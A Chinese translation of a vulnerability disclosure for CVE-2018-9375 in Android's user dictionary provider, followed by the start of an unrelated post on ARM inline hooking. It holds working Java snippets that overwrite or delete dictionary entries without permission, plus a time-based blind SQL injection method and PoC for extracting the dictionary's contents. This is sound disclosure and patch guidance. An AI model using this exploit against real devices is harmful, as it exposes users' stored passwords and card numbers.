&lt;p&gt;Android提供了一个自定义词典，可以手动输入或者自动定制，从用户的输入中学习。这本字典的入口为“设置→ 语言和键盘 → 个人词典” （也可能在“高级“或者不同的选项下）。他可能包含有敏感信息，比如姓名、地址、电话号码、电子邮件、密码、商业品牌、不存常的词汇（可能包括疾病、药品、技术术语等），甚至信用卡号。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212058.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;用户还可以为每个单词或者句子定义一个快捷方式，因此想要输入的家庭地址的时候，你可以添加一个条目并简单地为其添加一个快捷方式（比如“myhome”）来自动完成填写。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212115.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在内部，这些单词存储在SQLLite数据库中，该数据库只包含有一个名为“words”的表（除了“android_metadata” ），这个表有6列：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_id (INTEGER, PRIMARY KEY)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;word (TEXT)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;frequency (INTEGER)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;locale (TEXT)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;appid (INTEGER)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shortcut (TEXT)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们主要注意“word&amp;rdquo;这列，正如名称所示，它包含了自定义的单词。然而，同一数据库中所有剩余的列和表也可以访问。&lt;/p&gt;

&lt;h3 id=&#34;漏洞细节&#34;&gt;漏洞细节&lt;/h3&gt;

&lt;p&gt;在较早版本的Android中，对个人字典的读写访问分别受到以下权限的保护：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;android.permission.READ_USER_DICTIONARY&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;android.permission.WRITE_USER_DICTIONARY&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于新版本来说，这已经不再适用了，根据官方文档[1]:&amp;ldquo;从API 23开始，用户字典只能通过IME和拼写检查器访问” ，以前的权限已经被内部检查所取代，因此理论上，只有特权帐户(比如 &lt;code&gt;root&lt;/code&gt; 和 &lt;code&gt;system&lt;/code&gt;), 启用的IMEs和拼写检查器可以访问个人字典内容提供者  (&lt;code&gt;content://user_dictionary/words&lt;/code&gt;)。&lt;/p&gt;

&lt;p&gt;我们可以检查AOSP代码库，查看一个变更[2]中引入了一个新的名为&lt;code&gt;canCallerAccessUserDictionary&lt;/code&gt; 的私有函数，并从 &lt;code&gt;UserDictionary&lt;/code&gt;  内容提供者中的所有标准查询、插入、更新和删除函数中调用该函数，以防止对这些函数的未经授权的调用。&lt;/p&gt;

&lt;p&gt;虽然更改似乎对查询和插入函数都有效，但是在更新和删除过程中，授权检查发生滞后引入了安全漏洞，允许任何应用程序通过公开的内容提供者成功地调用受影响的函数，从而绕过错误的授权检查。&lt;/p&gt;

&lt;p&gt;在下面的 &lt;code&gt;UserDictionaryProvider&lt;/code&gt;类[3]的代码中，注意高亮（标注在注释）的片段，查看在数据库已经被修改之后如何执行授权检查：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override

public int delete(Uri uri, String where, String[] whereArgs) {
   SQLiteDatabase db = mOpenHelper.getWritableDatabase();
   int count;
   switch (sUriMatcher.match(uri)) {
      case WORDS:
          count = db.delete(USERDICT_TABLE_NAME, where, whereArgs);  //db.delete
          break;
 
      case WORD_ID:
          String wordId = uri.getPathSegments().get(1);
          count = db.delete(USERDICT_TABLE_NAME, Words._ID + &amp;quot;=&amp;quot; + wordId    //db.delete
               + (!TextUtils.isEmpty(where) ? &amp;quot; AND (&amp;quot; + where + &#39;)&#39; : &amp;quot;&amp;quot;), whereArgs);
          break;
 
       default:
          throw new IllegalArgumentException(&amp;quot;Unknown URI &amp;quot; + uri);
   }
 
   // Only the enabled IMEs and spell checkers can access this provider.
   if (!canCallerAccessUserDictionary()) {   //!canCallerAccessUserDictionary()
       return 0;
   }

   getContext().getContentResolver().notifyChange(uri, null);
   mBackupManager.dataChanged();
   return count;
}


@Override

public int update(Uri uri, ContentValues values, String where, String[] whereArgs) {
   SQLiteDatabase db = mOpenHelper.getWritableDatabase();
   int count;
   switch (sUriMatcher.match(uri)) {
      case WORDS:
         count = db.update(USERDICT_TABLE_NAME, values, where, whereArgs);  //db.update
         break;

      case WORD_ID:
         String wordId = uri.getPathSegments().get(1);
         count = db.update(USERDICT_TABLE_NAME, values, Words._ID + &amp;quot;=&amp;quot; + wordId  //db.update
+ (!TextUtils.isEmpty(where) ? &amp;quot; AND (&amp;quot; + where + &#39;)&#39; : &amp;quot;&amp;quot;), whereArgs);
         break;

      default:
         throw new IllegalArgumentException(&amp;quot;Unknown URI &amp;quot; + uri);
   }

   // Only the enabled IMEs and spell checkers can access this provider.
   if (!canCallerAccessUserDictionary()) {       //!canCallerAccessUserDictionary()
      return 0;
   }

   getContext().getContentResolver().notifyChange(uri, null);
   mBackupManager.dataChanged();
   return count;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最后注意&lt;code&gt;AndroidManifest.xml&lt;/code&gt;文件对于显式导出的内容提供者不提供任何额外的保护（例如，intent过滤器或权限）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;manifest xmlns:android=&amp;quot;http://schemas.android.com/apk/res/android&amp;quot;
       package=&amp;quot;com.android.providers.userdictionary&amp;quot;
       android:sharedUserId=&amp;quot;android.uid.shared&amp;quot;&amp;gt;

   &amp;lt;application android:process=&amp;quot;android.process.acore&amp;quot;
       android:label=&amp;quot;@string/app_label&amp;quot;
       android:allowClearUserData=&amp;quot;false&amp;quot;
       android:backupAgent=&amp;quot;DictionaryBackupAgent&amp;quot;
       android:killAfterRestore=&amp;quot;false&amp;quot;
       android:usesCleartextTraffic=&amp;quot;false&amp;quot;
       &amp;gt;

       &amp;lt;provider android:name=&amp;quot;UserDictionaryProvider&amp;quot;      //&amp;quot;UserDictionaryProvider&amp;quot;
          android:authorities=&amp;quot;user_dictionary&amp;quot;
          android:syncable=&amp;quot;false&amp;quot;
          android:multiprocess=&amp;quot;false&amp;quot;
          android:exported=&amp;quot;true&amp;quot; /&amp;gt;                     //android:exported=&amp;quot;true&amp;quot;

   &amp;lt;/application&amp;gt;
&amp;lt;/manifest&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;攻击者只需从任何恶意应用程序调用如下代码，就可以更新用户字典的内容，而无需请求任何许可：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;ContentValues values = new ContentValues();
values.put(UserDictionary.Words.WORD, &amp;quot;IOActive&amp;quot;);

getContentResolver().update(UserDictionary.Words.CONTENT_URI, values,
        null, null);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;删除任何内容，包括整个个人字典也很简单：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;getContentResolver().delete(UserDictionary.Words.CONTENT_URI, null, null); 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两种方法(&lt;code&gt;update&lt;/code&gt; 和&lt;code&gt;delete&lt;/code&gt;) 都应该返回受影响的行数，但是在这种情况下(对于非法的调用) 总是返回零，这使得攻击者更难从内容提供者提取或推断出任何信息。&lt;/p&gt;

&lt;p&gt;在这一点上，从攻击者者的角度来看，这可能是我们所能做的全部。虽然删除或更新任意条目可能会给最终用户带来麻烦，但最有趣的部分是访问个人数据。&lt;/p&gt;

&lt;p&gt;即使查询功能没有受到这个功能的直接影响，但仍然可以通过利用基于时间的侧通道攻击来转储整个内容。 由于攻击者完全可控&lt;code&gt;where&lt;/code&gt;参数，并且由于任何行的成功更新比不影响任何行的同一语句需要更多时间来执行，所以下面描述的攻击被证明是有效的。&lt;/p&gt;

&lt;h3 id=&#34;简单的poc&#34;&gt;简单的PoC&lt;/h3&gt;

&lt;p&gt;考虑从恶意应用程序运行以下代码片段:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;ContentValues values = new ContentValues();
values.put(UserDictionary.Words._ID, 1);

long t0 = System.nanoTime();
for (int i=0; i&amp;lt;200; i++) {
    getContentResolver().update(UserDictionary.Words.CONTENT_URI, values,
                    &amp;quot;_id = 1 AND word LIKE &#39;a%&#39;&amp;quot;, null);         //AND word LIKE &#39;a%&#39;&amp;quot;
}
long t1 = System.nanoTime();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;多次调用相同的语句（比如200次，取决于设备），计算为“true”的SQL条件与计算为“false”的条件之间的时间差(t1-t0)结果将是显而易见的,这将允许攻击者通过利用一个典型的基于时间的布尔盲注Sql注入攻击来提取出受影响数据库中的所有信息。&lt;/p&gt;

&lt;p&gt;因此，如果字典中的第一个用户自定义的单词以字母“a”开头，这个条件将被评估为“true”，上面的代码片段将需要更多的时间来执行（比如5秒），而当猜测为假时所需的时间较短(比如2秒)。因为在这种情况下，没有任何一行会被更新。如果猜错了，我们可以用“b”，“c”，等等。 如果猜测是正确的，就意味着我们知道单词的第一个字符，所以我们可以使用相同的方法来猜测第二个字符。然后我们可以移到下一个单词，以此类推，直到我们转储整个字典或任何可过滤的行和字段子集。&lt;/p&gt;

&lt;p&gt;为了避免更改数据库的内容，请注意我们如何更新检索到的单词的“id”列，以匹配它的原始值，因此内部幂等语句将如下所示：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;UPDATE words SET _id=N WHERE _id=N AND (condition)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果条件为真，那么带有标识符“N”的行会将以一种不会改变其标识符的方式进行更新，因为它将被设置为其原始值，而行则保持不变。这是一种非侵入性的方法，使用执行时间作为侧通道oracle来提取数据。&lt;/p&gt;

&lt;p&gt;因为我们可以用任何子SELECT语句替换上面的条件，所以这种攻击可以扩展到查询SQLite中支持的任何SQL表达式，例如：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&amp;lsquo;something&amp;rsquo;这个词存储在字典里吗？&lt;/li&gt;
&lt;li&gt;检索所有16个字符的单词（如信用卡号）&lt;/li&gt;
&lt;li&gt;检索所有有快捷方式的单词&lt;/li&gt;
&lt;li&gt;检索包含一个点的所有单词&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;真实的利用&#34;&gt;真实的利用&lt;/h3&gt;

&lt;p&gt;上面描述的过程可以完全自动化和优化。我开发了一个简单的Android应用程序来证明它的可利用性并测试它的有效性。&lt;/p&gt;

&lt;p&gt;PoC应用程序基于这样的假设：我们可以通过上述的内容提供者盲目地更新&lt;code&gt;UserDictionary&lt;/code&gt;数据库中的任意行。 如果内部更新语句影响一或多行，则需要更多的时间来执行。 这基本上是我们所需要的，以便推断以SQL条件形式的假设是否被评估为true或false。&lt;/p&gt;

&lt;p&gt;但是，由于在这个初始阶段，我们没有任何关于内容的信息(甚至没有内部标识符的值)，而不是遍历所有可能的标识符值，我们将从具有最低标识符的行开始， 并将其“frequency”字段的原始值粉碎为任意数字。这个步骤可以使用不同的有效方法来完成。&lt;/p&gt;

&lt;p&gt;由于多个共享进程将同时在Android上运行，因此相同调用的总运行时间会因不同的执行而有所不同。此外，执行时间还决于每个设备的处理能力和性能。然而，从统计的角度来看，重复相同的调用，大量的迭代应该给我们一个平均的可微度量。 这就是为什么我们需要调整每个设备和当前配置的迭代次数（例如，在省电模式下）。&lt;/p&gt;

&lt;p&gt;尽管我尝试了一种更复杂的方法来确定响应时间是否应该被解释成真或假，但我最终实现了一种更简单的方法，从而获得了准确和可靠的结果。 只要计算相同数量的总是为“true”请求（e.g. “&lt;code&gt;WHERE 1=1&lt;/code&gt;”) 和总是为”false&amp;rdquo;的请求(e.g. “&lt;code&gt;WHERE 1=0&lt;/code&gt;”)  ，并以平均时间作为临界值来区分它们。比临界值更大的测量时间将被解释为真; 反之为假。这不是人工智能或大数据，也不是使用区块链或云计算，而是 K.I.S.S. 原理适用并有效！&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212145.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;一旦我们有了区分正确和错误假设的方法，那么转储整个数据库就变得轻而易举了。前一节中描述的示例很容易理解，但它并不是最有效的提取信息的方法。 在我们的PoC中，我们将使用二分查找算法[4]来代替任何数字查询，使用以下简单的方法：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;确定表的行数（可选）

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT COUNT(*) FROM words&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;确定最低的标识符

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT MIN(_id) FROM words&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;使用该标识符确定单词的字符数。

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT length(word) FROM words WHERE _id=N&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;遍历该单词，通过字符提取字符（在字符/unicode中）

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT unicode(substr(word, i, 1)) FROM words WHERE _id=N&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;确定比我们得到的标识符大的最低标识符，并重复

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT MIN(_id) FROM words WHERE _id &amp;gt; N&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;请记住，我们不能直接检索任何数字或字符串值，因此我们需要将这些表达式转换为一组布尔查询，这些查询可以根据它们的执行时间计算为true或false。这就是二分查找算法的工作原理。我们不会直接查询一个数字，而是反复查询：它是否大于X？”，在每次迭代中调整X的值，直到在log(n)查询后找到正确的值为止。例如，如果检索的当前值是97，那么该算法的执行跟踪将如下所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212208.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;poc利用工具&#34;&gt;PoC利用工具&lt;/h3&gt;

&lt;p&gt;上面描述的过程是在PoC工具中实现的，如下所示 。这个PoC的源代码和编译的APK可以从下面的GitHub存储库找到： &lt;a href=&#34;https://github.com/IOActive/AOSP-ExploitUserDictionary&#34;&gt;https://github.com/IOActive/AOSP-ExploitUserDictionary&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;让我们看看它的极简用户界面，并解释它的特性。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212218.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;应用程序做的第一件事是尝试直接访问个人字典内容提供者，查询条目的数量。在正常情况下（不是作为root运行，等等），我们不应该有访问权限。 如果出于任何原因我们实现了直接访问，使用基于时间的盲注方法来利用任何东西是没有意义的，但是即使在这种情况下，我们也欢迎您将CPU运行浪费在这个PoC上，而不是挖掘加密货币。&lt;/p&gt;

&lt;p&gt;如前所述，只有两个参数需要调整：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Initial number of iterations&lt;/strong&gt; （初始迭代次数）：有多少次相同的调用会被重复以获得显著的时间差。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Minimum time threshold&lt;/strong&gt; （最短时间临界值，以毫秒为单位）：多少时间将被视为可接受的最低值。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然该工具的当前版本将自动调整它们，但在第一阶段，一切都是手动的，工具只是提供这些参数，因此这就是存在这些控制的原因之一。&lt;/p&gt;

&lt;p&gt;从理论上讲，这些数字越大，我们得到的精确度就越高，但提取的速度会更慢。如果它们更小，它将运行得更快，但它更有可能获得不准确的结果。这就是为什么存在最少10次迭代和200毫秒的硬编码。&lt;/p&gt;

&lt;p&gt;如果我们按下“开始”按钮，应用程序将启动参数的自动调整。首先，它将运行一些查询并丢弃结果，因为最初的查询通常比较高且不具有代表性。然后，它将执行初始的迭代次数并估计相应的临界值。如果获得的临界值超过了我们配置的最小值，那么它将运行20个连续的查询，交替执行true和false语句来测试估计的准确性。 如果准确度较差（只允许一个错误），然后，它将增加迭代次数，并按设定的次数重复处理，直到参数被适当调整，或者在条件不能满足时放弃和退出。&lt;/p&gt;

&lt;p&gt;一旦进程启动，一些控件将被禁用，我们将在下面的可滚动日志窗口(也通过logcat)中看到当前详细的输出，在其中我们可以看到当前行标识符、所有SQL子查询、总时间和推断的真实性。检索到的字符将在提取后立即出现在上面一行中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212230.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;最后，右边的“UPD&amp;rdquo;和DEL&amp;rdquo;按钮与基于时间的提取控件完全无关，他们只是简单地实现对内容提供者的直接调用，分别执行更新和删除操作。它们被有意地限制在只以“123”开头的单词。这样做是为了避免任何个人字典的意外删除，因此为了测试这些方法，我们需要手动添加这个条目，除非我们已经有了。&lt;/p&gt;

&lt;h3 id=&#34;demo&#34;&gt;Demo&lt;/h3&gt;

&lt;p&gt;总结这个过程的最简单的方法可能是在下面的视频中观看工具的动作，记录在一个真正的设备中。(可能无法观看)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=8i-oMcaJw40&#34;&gt;&lt;img src=&#34;http://img.youtube.com/vi/8i-oMcaJw40/0.jpg&#34; alt=&#34;IMAGE ALT TEXT HERE&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=VQf-INNTKKU&#34;&gt;&lt;img src=&#34;http://img.youtube.com/vi/VQf-INNTKKU/0.jpg&#34; alt=&#34;IMAGE ALT TEXT HERE&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;额外的注意事项&#34;&gt;额外的注意事项&lt;/h3&gt;

&lt;p&gt;理论和实践之间通常存在差距，所以我也想在这个PoC的设计和开发过程中分享我遇到的一些问题。 首先，请记住，该工具只是一个快速和肮脏的PoC。 它的主要目标是证明利用是可行的，并且可以直接实现，这就是为什么它有一些限制并且不遵循推荐的编程最佳实践，因为它不意味着可维护，高效，提供良好的用户体验，等等。&lt;/p&gt;

&lt;p&gt;在初始阶段，我并不关心UI，一切消息都被转储到Android日志输出中。当我决定在GUI中显示结果时，我不得不在一个单独的线程中运行所有的代码，以避免阻塞UI线程  (这可能会导致应用程序被认为是无响应的因此被操作系统杀死）。由于这个简单的更改，精确度大大下降，因为线程没有太高的优先级，所以我将其设置为“-20”，这是允许的最大优先级，之后一切都恢复正常工作了。&lt;/p&gt;

&lt;p&gt;从一个单独的线程更新UI可能会导致崩溃，通常会通过运行时异常来检测和限制，因此为了显示日志消息，我不得不使用对 &lt;code&gt;runOnUiThread&lt;/code&gt; 的调用来调用它们。请记住，在实际的利用中，根本不需要UI。&lt;/p&gt;

&lt;p&gt;如果个人字典为空，则不能使用任何行去强制更新，因此所有查询的执行时间大致相同。在这种情况下，将没有任何东西可以提取，工具也不会调整参数，最终会停止运行。在一些奇怪的情况下，它可能会被随机地校准，即使是空的数据库，它也会尝试提取垃圾或伪随机数据。&lt;/p&gt;

&lt;p&gt;在常规的智能手机中，操作系统会在一段时间后进入睡眠模式，性能会大幅下降，导致执行时间超过预期值，因此所有的调用都将被评估为true。这可以被检测到并以不同的方式做出反应，但我只是选择了一个更简单的解决方案：我一直打开屏幕，并通过电源管理器获得一个唤醒锁，以防止操作系统挂起应用程序。 之后我没有费心去释放它，所以如果您不使用，您必须得关闭应用程序。&lt;/p&gt;

&lt;p&gt;旋转屏幕也会引起问题，因此，我将它强制设置为横向模式，以避免自动旋转，并利用额外的宽度来显示每条消息。&lt;/p&gt;

&lt;p&gt;一旦你按下“开始”按钮，一些控件将被永久禁用。如果您想要重新调整参数或多次运行它，您需要关闭它并重新打开它。&lt;/p&gt;

&lt;p&gt;一些外部事件和并行执行（例如同步电子邮件或接收推送消息) 可能会干扰应用程序的行为，可能会导致不准确的结果。如果发生这种情况，请在更稳定的条件下再试一次，比如禁用对网络的访问或关闭所有其他应用程序。&lt;/p&gt;

&lt;p&gt;UI不支持国际化，它不是为了在Unicode中提取单词而设计的（尽管它应该是微不足道的，但它并不是我的目标，这只是简单的一个PoC）。&lt;/p&gt;

&lt;p&gt;它被有意地限制为只提取前5个单词，并根据它们的内部标识进行排序。&lt;/p&gt;

&lt;h3 id=&#34;修复&#34;&gt;修复&lt;/h3&gt;

&lt;p&gt;从源代码的角度来看，修复非常简单。只要移动调用来检查调用者是否拥有受影响函数开始的权限，就足以解决这个问题。除了这个建议之外，我们还向Google提供了一个补丁文件，其中包含了建议的修复程序，这是他们修复漏洞的公告：&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6&#34;&gt;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;由于这个问题已经在官方存储库中被修复了，作为用户，我们必须确保我们当前安装的安全补丁级别包含CVE-2018-9375的补丁。例如，在Google pixel/nexus中，它于2018年6月发布：&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://source.android.com/security/bulletin/pixel/2018-06-01&#34;&gt;https://source.android.com/security/bulletin/pixel/2018-06-01&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果由于任何原因，不能对您的设备进行更新，考虑检查您的个人字典的内容，并确保它不包含任何敏感信息，在不太可能的事件中，这个问题将被积极地利用。&lt;/p&gt;

&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;

&lt;p&gt;软件开发是困难的。一个错误的行可能导致不良的结果。一项旨在提高用户个人词典的安全性和保护的改变导致了相反的结果，因为它无意中允许访问，而不需要任何特定的许可，并且在近3年的时间里没有被注意到。&lt;/p&gt;

&lt;p&gt;识别像这里描述的那样的漏洞可以像阅读和理解源代码一样简单，只需遵循执行流程即可。自动化测试可能有助于在早期发现这类问题，并防止它们在进一步的更改中再次发生，但是它们并不总是那么容易实现和维护。&lt;/p&gt;

&lt;p&gt;我们还学会了如何从一个漏洞中得到最大的好处，这个漏洞原则上只允许我们盲目地破坏或篡改数据，从而增加了它对信息披露的最终影响，而信息泄露是利用一个侧信道、基于时间的攻击来泄露所有数据。&lt;/p&gt;

&lt;p&gt;跳出固有思维去思考一件事，记住：时间是最有价值的资源之一。纳秒千金!&lt;/p&gt;

&lt;p&gt;[1] &lt;a href=&#34;https://developer.android.com/reference/android/provider/UserDictionary&#34;&gt;https://developer.android.com/reference/android/provider/UserDictionary&lt;/a&gt;
[2] Gerrit’s Change-Id: I6c5716d4d6ea9d5f55a71b6268d34f4faa3ac043
&lt;a href=&#34;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/e0e0e0c9b27e10f7e33c371c490fdae8b634f117&#34;&gt;https://android.googlesource.com/platform/packages/providers/…&lt;/a&gt;
[3]At the time of discovery, it was found in the AOSP master branch:
&lt;a href=&#34;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/master/src/com/android/providers/userdictionary/UserDictionaryProvider.java&#34;&gt;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/…&lt;/a&gt;
After the fix, the equivalent contents can be found in the following commit:
&lt;a href=&#34;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/0272515f306cf7f12d2babe03d625850990a00c1/src/com/android/providers/userdictionary/UserDictionaryProvider.java&#34;&gt;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/…&lt;/a&gt;
[4 ]&lt;a href=&#34;https://en.wikipedia.org/wiki/Binary_search_algorithm&#34;&gt;https://en.wikipedia.org/wiki/Binary_search_algorithm&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;[原文：&lt;a href=&#34;https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/&#34;&gt;Discovering and Exploiting a Vulnerability in Android’s Personal Dictionary (CVE-2018-9375)&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
      
    </item>
    
    <item>
      <title>(转)Android Inline Hook中的指令修复详解</title>
      <link>https://naivete.cc/post/android-inline-hook%E4%B8%AD%E7%9A%84%E6%8C%87%E4%BB%A4%E4%BF%AE%E5%A4%8D%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 30 Jul 2018 15:03:41 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android-inline-hook%E4%B8%AD%E7%9A%84%E6%8C%87%E4%BB%A4%E4%BF%AE%E5%A4%8D%E8%AF%A6%E8%A7%A3/</guid>
      
        <description>

&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;本文是另一篇&lt;a href=&#34;https://gtoad.github.io/2018/07/06/Android-Native-Hook-Practice/&#34;&gt;《Android Native Hook工具实践》&lt;/a&gt;的一份补充文章，本人建议各位学习者先去看该篇主文以了解本文的需求背景。本文将会对该文中&lt;code&gt;指令修复&lt;/code&gt;部分的技术细节进行阐述。本文的部分源码来自于&lt;a href=&#34;http://ele7enxxh.com/Android-Arm-Inline-Hook.html&#34;&gt;ele7enxxh大神的项目&lt;/a&gt;，由于大神的技术博客里解释省略了较多细节，所以出于学习的目的，本人也会一点一点慢慢啃。同时由于该库并不完善，因此本文将补充该库没考虑到的一些修复指令方案，并且对许多特殊状况和Bug也尽力解决。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;目前需要进行指令修复的ARM32指令主要可以分为如下几类：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;BLX_ARM, BL_ARM, B_ARM（不包含条件跳转）, BX_ARM&lt;/li&gt;
&lt;li&gt;条件跳转BEQ_ARM BNE_ARM BCS_ARM BCC_ARM BMI_ARM BPL_ARM BVS_ARM BVC_ARM BHI_ARM BLS_ARM BGE_ARM BLT_ARM BGT_ARM BLE_ARM&lt;/li&gt;
&lt;li&gt;ADD_ARM&lt;/li&gt;
&lt;li&gt;ADR_ARM, LDR_ARM, MOV_ARM&lt;/li&gt;
&lt;li&gt;其它指令 OTHER_ARM&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Thumb16指令主要可以分为如下几类：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;B1_THUMB16（不包含条件跳转）, B2_THUMB16, BX_THUMB16&lt;/li&gt;
&lt;li&gt;条件跳转B1_BEQ_THUMB16, B1_BNE_THUMB16, B1_BCS_THUMB16, B1_BCC_THUMB16, B1_BMI_THUMB16, B1_BPL_THUMB16, B1_BVS_THUMB16, B1_BVC_THUMB16, B1_BHI_THUMB16, B1_BLS_THUMB16, B1_BGE_THUMB16, B1_BLT_THUMB16, B1_BGT_THUMB16, B1_BLE_THUMB16&lt;/li&gt;
&lt;li&gt;ADD_THUMB16&lt;/li&gt;
&lt;li&gt;MOV_THUMB16, ADR_THUMB16, LDR_THUMB16&lt;/li&gt;
&lt;li&gt;其它指令 OTHER_THUMB16&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Thumb32指令主要可以分为如下几类：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;B1_THUMB32（不包含条件跳转）, B2_THUMB32, BX_THUMB32, BLX_THUMB32, BL_THUMB32&lt;/li&gt;
&lt;li&gt;条件跳转B1_BEQ_THUMB32, B1_BNE_THUMB32, B1_BCS_THUMB32, B1_BCC_THUMB32, B1_BMI_THUMB32, B1_BPL_THUMB32, B1_BVS_THUMB32, B1_BVC_THUMB32, B1_BHI_THUMB32, B1_BLS_THUMB32, B1_BGE_THUMB32, B1_BLT_THUMB32, B1_BGT_THUMB32, B1_BLE_THUMB32&lt;/li&gt;
&lt;li&gt;TBB_THUMB32, TBH_THUMB32&lt;/li&gt;
&lt;li&gt;ADR1_THUMB32, ADR2_THUMB32, LDR_THUMB32&lt;/li&gt;
&lt;li&gt;其它指令 OTHER_THUMB32&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;下面我来一一分析它们具体的修复方案。其中条件跳转指令先单独拿出来作为一个部分进行讲解。&lt;/p&gt;

&lt;h2 id=&#34;条件跳转-以thumb16为例&#34;&gt;条件跳转（以Thumb16为例）&lt;/h2&gt;

&lt;p&gt;在ARM32、Thumb16、Thumb32中都是有条件跳转的指令的，本项目三套都修复了。下面来讲一下Thumb16下条件跳转的修复，因为三套指令的修复思路都是一样的。&lt;/p&gt;

&lt;p&gt;条件跳转指令的修复相比于其它种类的指令有一个明显恶心的地方，看下面两张图可以很明显看出来，先看第一张：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730150501.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

